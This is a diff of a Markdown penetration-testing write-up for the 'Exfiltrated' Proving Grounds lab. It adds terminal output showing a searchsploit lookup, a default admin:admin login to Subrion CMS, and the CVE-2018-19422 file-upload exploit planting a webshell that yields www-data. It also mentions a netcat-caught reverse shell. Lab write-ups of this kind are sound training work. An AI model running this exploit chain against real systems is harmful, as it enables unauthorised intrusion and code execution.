@@ -42,8 +42,7 @@ Nmap done: 1 IP address (1 host up) scanned in 38.50 seconds
 ```
 
 This gives us two running port, 22 for ssh and 80 for http.
-Visiting the homepage gives us the following:
-![[Pasted image 20240610152113.png]]
+
 As service scans gives following result:
 ```bash
 ┌──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/Exfiltrated]
@@ -76,10 +75,52 @@ Let’s us test some default combinations of `admin:admin`, `admin:password`,�
 Luckily, the first combination (`admin:admin`) allows us to bypass the login prompt and land on the `Admin Dashboard` page.
 
 There is an active `RCE exploit` on searchsploit as well
-![[Pasted image 20240610152308.png]]
+```bash
+┌──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/Exfiltrated]
+└─$ searchsploit Subrion 4.2  
+--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                         |  Path
+--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                                                                                | php/webapps/47469.txt
+Subrion CMS 4.2.1 - 'avatar[path]' XSS                                                                                                 | php/webapps/49346.txt
+Subrion CMS 4.2.1 - Arbitrary File Upload                                                                                              | php/webapps/49876.py
+Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                                                                       | php/webapps/50737.txt
+Subrion CMS 4.2.1 - Cross-Site Scripting                                                                                               | php/webapps/45150.txt
+--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                                                                                                         
+┌──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/Exfiltrated]
+└─$ searchsploit -m php/webapps/49876.py
+  Exploit: Subrion CMS 4.2.1 - Arbitrary File Upload
+      URL: https://www.exploit-db.com/exploits/49876
+     Path: /usr/share/exploitdb/exploits/php/webapps/49876.py
+    Codes: CVE-2018-19422
+ Verified: False
+File Type: Python script, ASCII text executable, with very long lines (956)
+Copied to: /home/kali/Desktop/PGPractice/Easy/Linux/Exfiltrated/49876.py
+```
 
 Running the following exploit gives us the `www-data` user
-![[Pasted image 20240610152352.png]]
+```
+┌──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/Exfiltrated]
+└─$ python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
+[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
+
+[+] Trying to connect to: http://exfiltrated.offsec/panel/
+[+] Success!
+[+] Got CSRF token: 4ySue9SKFPjazi0qBWUFHbhzRzdgWvOINMM6QVfE
+[+] Trying to log in...
+[+] Login Successful!
+
+[+] Generating random name for Webshell...
+[+] Generated webshell name: qavbfeuonalspfu
+
+[+] Trying to Upload Webshell..
+[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/qavbfeuonalspfu.phar 
+
+$ whoami
+www-data
+```
 
 Using revshells.com to make a bash reverse shell and catch it using `nc`
 ```bash
